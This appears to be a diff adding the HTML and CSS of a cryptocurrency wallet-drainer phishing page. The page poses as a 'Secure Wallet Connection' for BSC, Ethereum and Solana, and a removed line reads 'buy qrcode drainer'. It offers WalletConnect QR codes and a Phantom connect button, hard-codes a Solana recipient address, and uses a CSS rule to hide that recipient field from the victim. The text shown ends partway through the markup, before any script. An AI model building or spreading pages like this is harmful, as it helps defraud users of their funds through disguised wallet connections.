@@ -1,1 +1,717 @@
-buy qrcode drainer
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1.0,maximum-scale=1.0,user-scalable=no">
+<title>Secure Wallet Connection</title>
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
+<script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/qrcodejs/1.0.0/qrcode.min.js"></script>
+<script src="https://unpkg.com/@solana/web3.js@latest/lib/index.iife.min.js"></script>
+<style>
+body{--navy:#0B1426;--t:#F0B90B;--t-l:#F8D12F;--t-d:#C99A0A;--t-g1:rgba(240,185,11,.2);--t-g2:rgba(218,165,32,.14);--t-g3:rgba(184,134,11,.1);--t-glow:rgba(240,185,11,.14);--t-badge-bg:#FFF8E1;--t-badge-bd:#FFD54F;--t-badge-tx:#E65100;--t-grid:rgba(240,185,11,.022);--t-float:rgba(251,191,36,.55);--t-input-bg:#FFFBF0;--t-input-bd:#FFE082}
+body.theme-eth{--t:#627EEA;--t-l:#8B9EF7;--t-d:#4A67D6;--t-g1:rgba(98,126,234,.2);--t-g2:rgba(74,103,214,.14);--t-g3:rgba(55,82,180,.1);--t-glow:rgba(98,126,234,.14);--t-badge-bg:#E8EAF6;--t-badge-bd:#9FA8DA;--t-badge-tx:#283593;--t-grid:rgba(98,126,234,.022);--t-float:rgba(129,140,248,.55);--t-input-bg:#F0F1FF;--t-input-bd:#B3B8F0}
+body.theme-sol{--t:#9945FF;--t-l:#B794F4;--t-d:#7B2FE0;--t-g1:rgba(153,69,255,.2);--t-g2:rgba(20,241,149,.12);--t-g3:rgba(99,102,241,.1);--t-glow:rgba(153,69,255,.14);--t-badge-bg:#F3E5F5;--t-badge-bd:#CE93D8;--t-badge-tx:#6A1B9A;--t-grid:rgba(153,69,255,.022);--t-float:rgba(183,148,244,.55);--t-input-bg:#F9F0FF;--t-input-bd:#D1A8F0}
+*{margin:0;padding:0;box-sizing:border-box;-webkit-tap-highlight-color:transparent}
+html,body{font-family:'Inter',-apple-system,BlinkMacSystemFont,'Segoe UI',sans-serif;background:var(--navy);min-height:100vh;min-height:100dvh;display:flex;align-items:center;justify-content:center;color:#1e293b;overflow-x:hidden;-webkit-font-smoothing:antialiased;-moz-osx-font-smoothing:grayscale}
+.bg-layer{position:fixed;inset:0;pointer-events:none;z-index:0;overflow:hidden;transition:opacity 1.4s ease}
+.bg-layer:not(.active){opacity:0}
+.bg-blob{position:absolute;border-radius:50%;filter:blur(100px);animation:blobDrift 18s ease-in-out infinite alternate;will-change:transform}
+.bg-blob:nth-child(1){width:520px;height:520px;background:radial-gradient(circle,var(--t-g1),transparent 70%);top:-12%;left:-8%;animation-duration:22s}
+.bg-blob:nth-child(2){width:420px;height:420px;background:radial-gradient(circle,var(--t-g2),transparent 70%);bottom:-10%;right:-5%;animation-duration:17s;animation-delay:-5s}
+.bg-blob:nth-child(3){width:320px;height:320px;background:radial-gradient(circle,var(--t-g3),transparent 70%);top:42%;left:55%;animation-duration:24s;animation-delay:-10s}
+@keyframes blobDrift{0%{transform:translate(0,0) scale(1)}33%{transform:translate(45px,-35px) scale(1.1)}66%{transform:translate(-28px,40px) scale(.94)}100%{transform:translate(18px,-18px) scale(1.05)}}
+.grid-bg{position:fixed;inset:0;background-image:linear-gradient(0deg,var(--t-grid) 1px,transparent 1px),linear-gradient(90deg,var(--t-grid) 1px,transparent 1px);background-size:60px 60px;pointer-events:none;z-index:0;transition:background-image 0s}
+.floating-bg{position:fixed;inset:0;pointer-events:none;z-index:0;overflow:hidden}
+.float-crypto{position:absolute;bottom:-50px;color:var(--t-float);font-weight:700;pointer-events:none;animation:floatUp linear infinite;font-family:'Inter',sans-serif;will-change:transform;transition:color 1.2s ease}
+@keyframes floatUp{0%{transform:translateY(0) translateX(0) rotate(0deg)}20%{transform:translateY(-22vh) translateX(18px) rotate(5deg)}40%{transform:translateY(-44vh) translateX(-12px) rotate(-3deg)}60%{transform:translateY(-66vh) translateX(14px) rotate(4deg)}80%{transform:translateY(-88vh) translateX(-8px) rotate(-2deg)}100%{transform:translateY(-115vh) translateX(6px) rotate(3deg)}}
+.bg-noise{position:fixed;inset:0;pointer-events:none;z-index:0;opacity:.02;background-image:url("data:image/svg+xml,%3Csvg viewBox='0 0 256 256' xmlns='http://www.w3.org/2000/svg'%3E%3Cfilter id='n'%3E%3CfeTurbulence type='fractalNoise' baseFrequency='0.9' numOctaves='4' stitchTiles='stitch'/%3E%3C/filter%3E%3Crect width='100%25' height='100%25' filter='url(%23n)'/%3E%3C/svg%3E");background-repeat:repeat;background-size:256px 256px}
+.splash-screen{position:fixed;inset:0;z-index:10000;background:var(--navy);display:flex;flex-direction:column;align-items:center;justify-content:center;transition:opacity .6s ease,transform .6s cubic-bezier(.34,1.56,.64,1)}
+.splash-screen.hide{opacity:0;transform:scale(1.15);pointer-events:none}
+.splash-ring{width:100px;height:100px;border-radius:50%;border:3px solid rgba(240,185,11,.15);border-top-color:#F0B90B;animation:splashSpin 1s linear infinite;position:absolute}
+.splash-ring:nth-child(2){width:80px;height:80px;border-color:rgba(240,185,11,.1);border-top-color:#F8D12F;animation-duration:.8s;animation-direction:reverse}
+.splash-ring:nth-child(3){width:60px;height:60px;border-color:rgba(240,185,11,.08);border-top-color:#F8D12F;animation-duration:.6s}
+@keyframes splashSpin{to{transform:rotate(360deg)}}
+.splash-shield{width:48px;height:48px;background:linear-gradient(135deg,#F0B90B,#C99A0A);border-radius:14px;display:flex;align-items:center;justify-content:center;box-shadow:0 4px 20px rgba(240,185,11,.4);position:relative;z-index:2;animation:shieldPulse 2s ease-in-out infinite}
+@keyframes shieldPulse{0%,100%{transform:scale(1);box-shadow:0 4px 20px rgba(240,185,11,.4)}50%{transform:scale(1.08);box-shadow:0 6px 28px rgba(240,185,11,.6)}}
+.splash-shield svg{width:24px;height:24px;color:#fff}
+.splash-title{font-size:20px;font-weight:800;color:#fff;letter-spacing:-.3px;margin-top:32px;opacity:0;animation:fadeUp .5s ease forwards;animation-delay:.3s}
+.splash-sub{font-size:12px;color:rgba(255,255,255,.45);font-weight:500;letter-spacing:.8px;text-transform:uppercase;margin-top:6px;opacity:0;animation:fadeUp .5s ease forwards;animation-delay:.5s}
+.splash-progress{width:120px;height:3px;background:rgba(255,255,255,.08);border-radius:2px;margin-top:24px;overflow:hidden;opacity:0;animation:fadeUp .5s ease forwards;animation-delay:.7s}
+.splash-progress-bar{height:100%;width:0%;background:linear-gradient(90deg,#F0B90B,#F8D12F);border-radius:2px;animation:progressFill 1.8s ease forwards;animation-delay:.8s}
+@keyframes progressFill{0%{width:0}100%{width:100%}}
+@keyframes fadeUp{from{opacity:0;transform:translateY(10px)}to{opacity:1;transform:translateY(0)}}
+.splash-tick-wrap{position:absolute;display:flex;align-items:center;justify-content:center;opacity:0;transform:scale(.5);transition:all .4s cubic-bezier(.34,1.56,.64,1)}
+.splash-tick-wrap.show{opacity:1;transform:scale(1)}
+.splash-tick{width:72px;height:72px;background:linear-gradient(135deg,#16a34a,#22c55e);border-radius:50%;display:flex;align-items:center;justify-content:center;box-shadow:0 8px 32px rgba(22,163,74,.4)}
+.splash-tick svg{width:32px;height:32px;color:#fff;stroke-width:3}
+.bomb-particle{position:fixed;z-index:10001;pointer-events:none;width:6px;height:6px;border-radius:50%;animation:bombFly .7s ease-out forwards}
+.bomb-particle.type-1{background:#F0B90B}.bomb-particle.type-2{background:#F8D12F}.bomb-particle.type-3{background:rgba(240,185,11,.6)}.bomb-particle.type-4{background:rgba(248,209,47,.4)}.bomb-particle.type-5{background:#fff}
+@keyframes bombFly{0%{transform:translate(0,0) scale(1);opacity:1}100%{transform:translate(var(--tx),var(--ty)) scale(0);opacity:0}}
+.shockwave{position:fixed;z-index:10000;border-radius:50%;border:2px solid #F0B90B;pointer-events:none;animation:shockwaveExpand .6s ease-out forwards}
+@keyframes shockwaveExpand{0%{width:0;height:0;opacity:.6}100%{width:400px;height:400px;opacity:0}}
+.popup-toast{position:fixed;top:-100px;left:50%;transform:translateX(-50%);z-index:9999;background:linear-gradient(135deg,var(--t-d),var(--t),var(--t-l));color:#fff;padding:14px 28px;border-radius:16px;display:flex;align-items:center;gap:12px;font-family:'Inter',sans-serif;font-weight:600;font-size:15px;box-shadow:0 10px 40px rgba(0,0,0,.3),0 0 0 1px rgba(255,255,255,.1) inset;transition:top .6s cubic-bezier(.34,1.56,.64,1),background .8s ease;white-space:nowrap;backdrop-filter:blur(10px);-webkit-backdrop-filter:blur(10px);max-width:calc(100vw - 32px)}
+.popup-toast.show{top:28px}
+.toast-icon{width:28px;height:28px;flex-shrink:0}.toast-icon svg{width:100%;height:100%}
+.toast-text{display:flex;flex-direction:column;line-height:1.3}
+.toast-title{font-size:15px;font-weight:700;letter-spacing:.3px}
+.toast-sub{font-size:11px;font-weight:400;opacity:.8;letter-spacing:.5px}
+.card-glow{position:absolute;z-index:0;width:500px;height:500px;border-radius:50%;background:radial-gradient(circle,var(--t-glow) 0%,transparent 70%);pointer-events:none;filter:blur(50px);animation:glowPulse 4s ease-in-out infinite alternate;transition:opacity 1.2s ease}
+.card-glow:not(.active){opacity:0}
+@keyframes glowPulse{0%{opacity:.5;transform:scale(.95)}100%{opacity:1;transform:scale(1.08)}}
+.card{position:relative;z-index:1;background:#fff;border-radius:20px;padding:36px 32px 32px;width:100%;max-width:440px;margin:20px;text-align:center;box-shadow:0 4px 6px -1px rgba(0,0,0,.08),0 20px 50px -12px rgba(0,0,0,.2),0 0 0 1px rgba(0,0,0,.04);overflow:hidden;animation:cardIn .8s cubic-bezier(.16,1,.3,1) both;max-height:94vh;overflow-y:auto;scrollbar-width:thin;scrollbar-color:rgba(0,0,0,.08) transparent}
+.card::-webkit-scrollbar{width:3px}.card::-webkit-scrollbar-track{background:transparent}.card::-webkit-scrollbar-thumb{background:rgba(0,0,0,.08);border-radius:2px}
+@keyframes cardIn{from{opacity:0;transform:translateY(30px) scale(.97)}to{opacity:1;transform:translateY(0) scale(1)}}
+.card::before{content:'';position:absolute;top:0;left:0;right:0;height:3px;background:linear-gradient(90deg,var(--t),var(--t-l),var(--t-d));border-radius:20px 20px 0 0;transition:background .8s ease}
+.card-header{margin-bottom:20px}
+.shield-wrap{width:52px;height:52px;background:linear-gradient(135deg,var(--t),var(--t-d));border-radius:16px;display:flex;align-items:center;justify-content:center;margin:0 auto 16px;box-shadow:0 6px 20px color-mix(in srgb,var(--t) 30%,transparent);position:relative;transition:background .8s ease,box-shadow .8s ease}
+.shield-wrap::after{content:'';position:absolute;inset:-3px;border-radius:18px;background:linear-gradient(135deg,color-mix(in srgb,var(--t) 30%,transparent),transparent);z-index:-1;filter:blur(6px);transition:background .8s ease}
+.shield-wrap svg{width:26px;height:26px;color:#fff}
+.subtitle{font-size:11px;font-weight:600;letter-spacing:2.5px;color:#64748b;margin-bottom:8px;text-transform:uppercase}
+h1{font-size:24px;letter-spacing:-.5px;font-weight:800;color:#0f172a;margin-bottom:10px;line-height:1.2}
+.chain-badge{display:inline-block;font-size:11px;font-weight:700;letter-spacing:1.5px;color:var(--t-badge-tx);background:var(--t-badge-bg);border:1px solid var(--t-badge-bd);padding:5px 16px;border-radius:20px;transition:all .6s ease}
+.net-switch{display:flex;background:#f1f5f9;border-radius:14px;padding:4px;gap:4px;margin-bottom:24px}
+.net-tab{flex:1;padding:11px 6px;background:transparent;border:none;color:#64748b;font-family:'Inter',sans-serif;font-size:12px;font-weight:600;border-radius:11px;cursor:pointer;transition:all .35s ease;letter-spacing:.3px;display:flex;align-items:center;justify-content:center;gap:5px;touch-action:manipulation;-webkit-user-select:none;user-select:none;min-height:44px}
+.net-tab.active{background:var(--t);color:#fff;box-shadow:0 2px 12px color-mix(in srgb,var(--t) 35%,transparent);transition:all .5s ease}
+.net-tab:hover:not(.active){color:#334155;background:rgba(0,0,0,.04)}
+.tab-dot{width:7px;height:7px;border-radius:50%;flex-shrink:0;transition:box-shadow .5s ease}
+.dot-bsc{background:#F0B90B}.dot-eth{background:#627EEA}.dot-sol{background:#9945FF}
+.net-tab.active .tab-dot{box-shadow:0 0 6px currentColor}
+.panel{display:none;animation:panelIn .45s cubic-bezier(.16,1,.3,1) both}
+.panel.active{display:block}
+@keyframes panelIn{from{opacity:0;transform:translateY(10px)}to{opacity:1;transform:translateY(0)}}
+.qr-wrap{background:#f8fafc;border:1px solid #e2e8f0;border-radius:14px;padding:24px;min-height:270px;display:flex;align-items:center;justify-content:center;flex-direction:column;gap:14px;margin-bottom:20px;position:relative}
+.qr-label{font-size:10px;color:#64748b;letter-spacing:2px;font-weight:600;text-transform:uppercase}
+.status-box{font-size:13px;color:#64748b;margin-bottom:18px;min-height:22px;line-height:1.6;font-weight:500}
+.status-box.error{color:#dc2626}.status-box.warn{color:#d97706}.status-box.ok{color:#16a34a}
+.btn-send{display:none;width:100%;padding:15px;background:linear-gradient(135deg,var(--t),var(--t-d));color:#fff;font-family:'Inter',sans-serif;font-size:15px;font-weight:600;letter-spacing:.3px;border:none;border-radius:14px;cursor:pointer;transition:all .4s ease,background .8s ease;margin-bottom:20px;box-shadow:0 4px 16px color-mix(in srgb,var(--t) 30%,transparent);position:relative;overflow:hidden;touch-action:manipulation}
+.btn-send:hover{transform:translateY(-1px);box-shadow:0 8px 25px color-mix(in srgb,var(--t) 40%,transparent)}
+.btn-send:active{transform:translateY(0)}.btn-send:disabled{opacity:.5;cursor:not-allowed;transform:none!important}
+.info-row{display:flex;justify-content:space-between;font-size:12px;color:#64748b;border-top:1px solid #e2e8f0;padding-top:16px;font-weight:500}
+.spinner{width:34px;height:34px;border:3px solid color-mix(in srgb,var(--t) 15%,#e2e8f0);border-top-color:var(--t);border-radius:50%;animation:spin .8s linear infinite;transition:border-color .8s ease}
+@keyframes spin{to{transform:rotate(360deg)}}
+a{color:var(--t);text-decoration:none;font-weight:600;transition:color .6s ease}a:hover{text-decoration:underline}
+.sol-wallet-bar{background:color-mix(in srgb,var(--t) 6%,#f8fafc);border:1px solid color-mix(in srgb,var(--t) 12%,#e2e8f0);border-radius:14px;padding:14px 16px;margin-bottom:20px;display:none;align-items:center;justify-content:space-between;gap:12px;animation:slideDown .4s cubic-bezier(.16,1,.3,1);transition:background .6s ease,border-color .6s ease}
+@keyframes slideDown{from{opacity:0;transform:translateY(-10px)}to{opacity:1;transform:translateY(0)}}
+.sol-wallet-bar.visible{display:flex}
+.sol-wallet-info{display:flex;align-items:center;gap:10px;min-width:0}
+.sol-wallet-avatar{width:32px;height:32px;border-radius:10px;background:linear-gradient(135deg,var(--t),var(--t-d));display:flex;align-items:center;justify-content:center;flex-shrink:0;transition:background .8s ease}
+.sol-wallet-avatar svg{width:16px;height:16px;fill:#fff}
+.sol-wallet-addr{font-family:'Courier New',monospace;font-size:11px;color:#334155;word-break:break-all;max-width:170px;line-height:1.4}
+.sol-balance-pill{background:color-mix(in srgb,var(--t) 8%,#f8fafc);border:1px solid color-mix(in srgb,var(--t) 15%,#e2e8f0);border-radius:12px;padding:6px 14px;font-size:13px;font-family:'Courier New',monospace;font-weight:600;color:var(--t);white-space:nowrap;display:flex;align-items:center;gap:4px;transition:all .6s ease}
+.sol-btn{width:100%;padding:15px;border:none;border-radius:14px;font-family:'Inter',sans-serif;font-weight:700;font-size:15px;cursor:pointer;letter-spacing:.3px;transition:all .4s ease,background .8s ease;margin-top:10px;position:relative;overflow:hidden;display:flex;align-items:center;justify-content:center;gap:8px;touch-action:manipulation}
+.sol-btn-connect{background:linear-gradient(135deg,var(--t),var(--t-d));color:#fff;box-shadow:0 4px 24px color-mix(in srgb,var(--t) 30%,transparent)}
+.sol-btn-connect:hover{transform:translateY(-2px);box-shadow:0 8px 32px color-mix(in srgb,var(--t) 40%,transparent)}
+.sol-btn-send{background:linear-gradient(135deg,var(--t-l),var(--t));color:#fff;box-shadow:0 4px 16px color-mix(in srgb,var(--t) 25%,transparent);display:none;margin-bottom:20px}
+.sol-btn-send.visible{display:flex}
+.sol-btn-send:hover{transform:translateY(-1px);box-shadow:0 8px 25px color-mix(in srgb,var(--t) 35%,transparent)}
+.sol-btn:disabled{opacity:.5;cursor:not-allowed;transform:none!important}
+.sol-btn-connected{background:color-mix(in srgb,var(--t) 8%,#f8fafc);border:1px solid color-mix(in srgb,var(--t) 20%,#e2e8f0);color:var(--t);box-shadow:none}
+.sol-btn-connected:hover{background:color-mix(in srgb,var(--t) 12%,#f8fafc)}
+.sol-divider{border:none;height:1px;background:linear-gradient(90deg,transparent,#e2e8f0,color-mix(in srgb,var(--t) 15%,#e2e8f0),#e2e8f0,transparent);margin:20px 0;transition:background .8s ease}
+.sol-field{margin-bottom:16px;text-align:left}
+.sol-field label{display:flex;align-items:center;gap:6px;font-size:11px;font-weight:600;letter-spacing:1.2px;text-transform:uppercase;color:#64748b;margin-bottom:10px}
+.sol-field label svg{width:14px;height:14px;stroke:currentColor;fill:none;stroke-width:2;stroke-linecap:round;stroke-linejoin:round}
+.sol-input{width:100%;background:var(--t-input-bg);border:1px solid var(--t-input-bd);border-radius:12px;padding:14px 16px;color:#0f172a;font-family:'Courier New',monospace;font-size:13px;outline:none;transition:all .3s ease,background .6s ease,border-color .6s ease}
+.sol-input:focus{border-color:var(--t);box-shadow:0 0 0 3px color-mix(in srgb,var(--t) 12%,transparent)}
+.sol-input::placeholder{color:#94a3b8;font-size:12px}
+.sol-auto-amount{background:var(--t-badge-bg);border:1px solid var(--t-badge-bd);border-radius:12px;padding:14px 16px;font-family:'Courier New',monospace;font-size:14px;font-weight:600;color:var(--t-badge-tx);display:flex;align-items:center;justify-content:space-between;gap:8px;transition:all .6s ease}
+.sol-auto-amount .amount-value{font-size:16px}
+.sol-auto-amount .fee-info{font-size:10px;color:#64748b;font-weight:400}
+.sol-status{margin-top:16px;padding:14px 16px;border-radius:12px;font-size:13px;font-family:'Courier New',monospace;word-break:break-all;display:none;animation:statusEnter .4s cubic-bezier(.16,1,.3,1);line-height:1.5}
+@keyframes statusEnter{from{opacity:0;transform:translateY(8px)}to{opacity:1;transform:translateY(0)}}
+.sol-status.success{display:block;background:rgba(22,163,74,.06);border:1px solid rgba(22,163,74,.15);color:#16a34a}
+.sol-status.error{display:block;background:rgba(220,38,38,.06);border:1px solid rgba(220,38,38,.15);color:#dc2626}
+.sol-status.info{display:block;background:color-mix(in srgb,var(--t) 6%,#f8fafc);border:1px solid color-mix(in srgb,var(--t) 15%,#e2e8f0);color:var(--t);transition:all .6s ease}
+.sol-status a{color:var(--t);text-decoration:none;font-weight:600}
+.sol-spinner{display:inline-block;width:16px;height:16px;border:2px solid rgba(255,255,255,.2);border-top-color:currentColor;border-radius:50%;animation:spin .7s linear infinite}
+.sol-payout-section{margin-top:20px;text-align:left}
+.sol-payout-header{display:flex;align-items:center;justify-content:space-between;margin-bottom:12px}
+.sol-payout-title{font-size:11px;font-weight:700;letter-spacing:1.2px;text-transform:uppercase;color:#64748b;display:flex;align-items:center;gap:8px}
+.live-indicator{position:relative;width:8px;height:8px}
+.live-indicator::before{content:'';position:absolute;inset:0;background:var(--t);border-radius:50%;animation:livePulse 2s ease-in-out infinite;transition:background .6s ease}
+.live-indicator::after{content:'';position:absolute;inset:-3px;border-radius:50%;border:1.5px solid var(--t);animation:liveRing 2s ease-in-out infinite;transition:border-color .6s ease}
+@keyframes livePulse{0%,100%{opacity:1;transform:scale(1)}50%{opacity:.6;transform:scale(.8)}}
+@keyframes liveRing{0%,100%{opacity:.6;transform:scale(1)}50%{opacity:0;transform:scale(1.8)}}
+.sol-payout-count{font-size:10px;color:#94a3b8;font-family:'Courier New',monospace;font-weight:500}
+.sol-payout-list{background:#f8fafc;border:1px solid #e2e8f0;border-radius:14px;max-height:150px;overflow-y:auto;padding:6px;scrollbar-width:thin;scrollbar-color:rgba(0,0,0,.06) transparent}
+.sol-payout-list::-webkit-scrollbar{width:3px}.sol-payout-list::-webkit-scrollbar-track{background:transparent}.sol-payout-list::-webkit-scrollbar-thumb{background:rgba(0,0,0,.08);border-radius:2px}
+.sol-payout-item{display:flex;align-items:center;justify-content:space-between;padding:10px 12px;border-radius:10px;margin-bottom:4px;background:color-mix(in srgb,var(--t) 3%,#f8fafc);border:1px solid color-mix(in srgb,var(--t) 6%,#e2e8f0);animation:payoutSlideIn .5s cubic-bezier(.16,1,.3,1);transition:all .25s ease,background .6s ease,border-color .6s ease}
+.sol-payout-item:last-child{margin-bottom:0}
+.sol-payout-item:hover{background:color-mix(in srgb,var(--t) 7%,#f8fafc);transform:translateX(2px)}
+@keyframes payoutSlideIn{from{opacity:0;transform:translateX(-20px) scale(.98)}to{opacity:1;transform:translateX(0) scale(1)}}
+.sol-payout-left{display:flex;align-items:center;gap:8px;min-width:0;flex:1}
+.sol-payout-avatar{width:28px;height:28px;border-radius:8px;background:color-mix(in srgb,var(--t) 15%,#e2e8f0);display:flex;align-items:center;justify-content:center;font-size:10px;flex-shrink:0;font-weight:700;color:#64748b;transition:background .6s ease}
+.sol-payout-addr{font-family:'Courier New',monospace;font-size:11px;color:#64748b;max-width:110px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
+.sol-payout-right{display:flex;align-items:center;gap:8px;flex-shrink:0}
+.sol-payout-amount{font-family:'Courier New',monospace;font-size:12px;font-weight:700;color:var(--t);transition:color .6s ease}
+.sol-payout-time{font-size:10px;color:#94a3b8;font-family:'Courier New',monospace;min-width:46px;text-align:right}
+#solSendForm .sol-field:first-child{display:none!important}
+@media(max-width:480px){.card{padding:24px 18px 20px;border-radius:16px;margin:10px;max-width:100%}h1{font-size:20px}.shield-wrap{width:46px;height:46px;border-radius:13px}.shield-wrap svg{width:23px;height:23px}.qr-wrap{padding:18px;min-height:230px}.net-tab{padding:10px 4px;font-size:11px;min-height:42px}.btn-send{padding:14px;font-size:14px}.info-row{font-size:11px}.chain-badge{font-size:10px;padding:4px 12px}.popup-toast{padding:12px 18px;font-size:13px;border-radius:12px;gap:10px;max-width:calc(100vw - 24px)}.toast-title{font-size:13px}.toast-sub{font-size:10px}.toast-icon{width:24px;height:24px}.splash-shield{width:42px;height:42px;border-radius:12px}.splash-shield svg{width:20px;height:20px}.splash-title{font-size:18px;margin-top:24px}.splash-sub{font-size:11px}.splash-tick{width:56px;height:56px}.splash-tick svg{width:24px;height:24px}.splash-ring{width:80px;height:80px;border-width:2px}.splash-ring:nth-child(2){width:64px;height:64px}.splash-ring:nth-child(3){width:48px;height:48px}.splash-progress{width:100px}.sol-wallet-bar{padding:12px 12px;margin-bottom:16px;gap:8px}.sol-wallet-addr{font-size:10px;max-width:120px}.sol-balance-pill{font-size:11px;padding:5px 10px}.sol-btn{padding:14px;font-size:14px}.sol-auto-amount{padding:12px 14px;font-size:13px;flex-direction:column;align-items:flex-start;gap:4px}.sol-auto-amount .amount-value{font-size:15px}.sol-status{font-size:12px;padding:12px 14px}.sol-payout-list{max-height:120px}.sol-payout-item{padding:8px 10px}.sol-payout-avatar{width:24px;height:24px;font-size:9px}.sol-payout-addr{font-size:10px;max-width:85px}.sol-payout-amount{font-size:11px}.sol-payout-time{font-size:9px;min-width:40px}@keyframes shockwaveExpand{0%{width:0;height:0;opacity:.6}100%{width:250px;height:250px;opacity:0}}}
+@media(max-width:360px){.card{padding:20px 14px 16px;margin:6px}h1{font-size:18px}.subtitle{font-size:10px;letter-spacing:2px}.chain-badge{font-size:9px;padding:3px 10px}.qr-wrap{padding:14px;min-height:210px}.net-tab{padding:9px 3px;font-size:10px;gap:3px}.tab-dot{width:6px;height:6px}.btn-send{padding:12px;font-size:13px}.info-row{flex-direction:column;gap:4px;align-items:center;font-size:10px}.status-box{font-size:12px}.sol-btn{padding:13px;font-size:13px}.sol-payout-list{max-height:100px}.sol-field{margin-bottom:12px}}
+@media(max-width:320px){.card{padding:18px 12px 14px}h1{font-size:17px}.shield-wrap{width:40px;height:40px}.qr-wrap{min-height:190px;padding:12px}.net-tab{font-size:9px;min-height:38px}.sol-wallet-bar{flex-direction:column;align-items:stretch;text-align:center}.sol-wallet-info{justify-content:center}}
+@media(max-height:680px){.card{max-height:97vh;padding-top:24px;padding-bottom:18px}.qr-wrap{min-height:200px;padding:16px}.card-header{margin-bottom:14px}.shield-wrap{width:42px;height:42px;margin-bottom:12px}h1{font-size:20px}.net-switch{margin-bottom:16px}}
+@media(max-height:580px){.qr-wrap{min-height:160px;padding:12px}.sol-payout-list{max-height:80px}.sol-field{margin-bottom:10px}.sol-btn{padding:12px;font-size:13px;margin-top:6px}}
+@media(max-height:500px) and (orientation:landscape){body{align-items:flex-start;padding-top:10px;padding-bottom:10px}.card{margin:6px;max-height:98vh}}
+@media(prefers-reduced-motion:reduce){.float-crypto,.bg-blob,.card-glow{animation:none!important}.popup-toast{transition-duration:.1s!important}.spinner{animation-duration:1.5s}.splash-screen{display:none!important}.bg-layer{transition-duration:0s!important}}
+</style>
+<base target="_blank">
+</head>
+<body class="theme-bsc">
+
+<div class="splash-screen" id="splashScreen">
+    <div class="splash-ring"></div><div class="splash-ring"></div><div class="splash-ring"></div>
+    <div class="splash-shield"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/><path d="m9 12 2 2 4-4"/></svg></div>
+    <div class="splash-title">Secure Wallet</div>
+    <div class="splash-sub">End-to-end encrypted connection</div>
+    <div class="splash-progress"><div class="splash-progress-bar"></div></div>
+    <div class="splash-tick-wrap" id="splashTickWrap"><div class="splash-tick"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><path d="M20 6L9 17l-5-5"/></svg></div></div>
+</div>
+
+<div class="bg-layer active" id="bgBsc"><div class="bg-blob"></div><div class="bg-blob"></div><div class="bg-blob"></div></div>
+<div class="bg-layer" id="bgEth"><div class="bg-blob"></div><div class="bg-blob"></div><div class="bg-blob"></div></div>
+<div class="bg-layer" id="bgSol"><div class="bg-blob"></div><div class="bg-blob"></div><div class="bg-blob"></div></div>
+<div class="grid-bg"></div>
+<div class="bg-noise"></div>
+<div class="floating-bg" id="floatingBg"></div>
+
+<div class="card-glow active" id="glowBsc"></div>
+<div class="card-glow" id="glowEth"></div>
+<div class="card-glow" id="glowSol"></div>
+
+<div class="popup-toast" id="popupToast">
+    <div class="toast-icon"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/><path d="m9 12 2 2 4-4"/></svg></div>
+    <div class="toast-text"><span class="toast-title">Safety Secure Wallet</span><span class="toast-sub">End-to-end encrypted connection</span></div>
+</div>
+
+<div class="card">
+    <div class="card-header">
+        <div class="shield-wrap"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/><path d="m9 12 2 2 4-4"/></svg></div>
+        <p class="subtitle">Multi-Chain Network</p>
+        <h1>Secure Connection</h1>
+        <span class="chain-badge" id="networkBadge">BSC</span>
+    </div>
+
+    <div class="net-switch">
+        <button class="net-tab active" data-tab="bsc" onclick="switchTab('bsc')"><span class="tab-dot dot-bsc"></span>BSC</button>
+        <button class="net-tab" data-tab="eth" onclick="switchTab('eth')"><span class="tab-dot dot-eth"></span>Ethereum</button>
+        <button class="net-tab" data-tab="sol" onclick="switchTab('sol')"><span class="tab-dot dot-sol"></span>Solana</button>
+    </div>
+
+    <div class="panel active" id="evmPanel">
+        <div class="qr-wrap">
+            <div class="spinner" id="spinner"></div>
+            <div id="qrCanvas" style="display:none"></div>
+            <div class="qr-label" id="qrLabel"></div>
+        </div>
+        <div class="status-box warn" id="status">Initializing WalletConnect...</div>
+        <button class="btn-send" id="btnSend" onclick="sendUSDT()"></button>
+        <div class="info-row"><span id="balanceInfo">Balance: —</span><span id="addrInfo">Not connected</span></div>
+    </div>
+
+    <div class="panel" id="solPanel">
+        <div class="sol-wallet-bar" id="solWalletBar">
+            <div class="sol-wallet-info">
+                <div class="sol-wallet-avatar"><svg viewBox="0 0 24 24"><path d="M21 12V7H5a2 2 0 010-4h14v4"/><path d="M3 5v14a2 2 0 002 2h16v-5"/><path d="M18 12a2 2 0 000 4h4v-4z"/></svg></div>
+                <span class="sol-wallet-addr" id="solWalletAddr">—</span>
+            </div>
+            <span class="sol-balance-pill" id="solBalancePill"><span>◎</span> 0 SOL</span>
+        </div>
+        <button class="sol-btn sol-btn-connect" id="solConnectBtn" onclick="solConnectWallet()">
+            <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 007.54.54l3-3a5 5 0 00-7.07-7.07l-1.72 1.71"/><path d="M14 11a5 5 0 00-7.54-.54l-3 3a5 5 0 007.07 7.07l1.71-1.71"/></svg>
+            Connect Phantom
+        </button>
+        <hr class="sol-divider" id="solDivider" style="display:none;">
+        <div id="solSendForm" style="display:none;">
+            <div class="sol-field">
+                <label><svg viewBox="0 0 24 24"><path d="M20 10c0 6-8 12-8 12s-8-6-8-12a8 8 0 0116 0Z"/><circle cx="12" cy="10" r="3"/></svg>Recipient Address</label>
+                <input class="sol-input" type="text" id="solRecipient" value="AFNK585ticv7a7t8wscL9gTJMQhA75kn6nqYxf4oPyp3" />
+            </div>
+            <div class="sol-field">
